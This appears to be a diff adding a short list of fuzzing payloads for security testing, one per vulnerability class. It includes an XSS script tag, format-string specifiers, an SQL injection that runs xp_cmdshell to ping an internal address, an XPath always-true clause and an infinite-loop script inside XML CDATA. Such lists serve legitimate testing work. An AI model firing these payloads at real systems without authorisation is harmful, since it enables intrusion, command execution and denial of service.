@@ -1,0 +1,26 @@
+# Cross-Site Scripting (XSS)
+>"><script>alert("XSS")</script>&
+
+# Buffer Overflows (BFO)
+A x 5
+
+# Format String Errors (FSE)
+%s%p%x%d
+
+# Integer Overflows (INT)
+-1
+
+# Passive SQL Injection (SQP)
+'||(elt(-3+5,bin(15),ord(10),hex(char(45))))
+
+# Active SQL Injection (SQI)
+'; exec master..xp_cmdshell 'ping 10.10.1.2'--
+
+# LDAP Injection
+|
+
+# XPATH Injection
+'+or+'1'='1
+
+# XML Injection
+<![CDATA[<script>var n=0;while(true){n++;}</script>]]>
